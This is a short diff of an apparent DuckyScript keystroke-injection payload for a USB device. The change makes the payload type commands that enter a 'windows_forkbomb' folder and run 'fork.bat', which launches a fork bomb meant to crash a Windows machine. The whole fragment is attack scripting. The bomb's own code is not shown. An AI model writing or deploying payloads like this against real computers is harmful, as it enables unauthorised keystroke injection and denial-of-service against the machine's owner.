@@ -23,5 +23,8 @@ DELAY 1000
 
 REM run the script
 DELAY 4000
-STRING \Users\nickrobillard\windows_forkbomb\fork.bat
-DELAY 1000
+STRING cd windows_forkbomb
+ENTER
+DELAY 3000
+STRING ./fork.bat
+ENTER
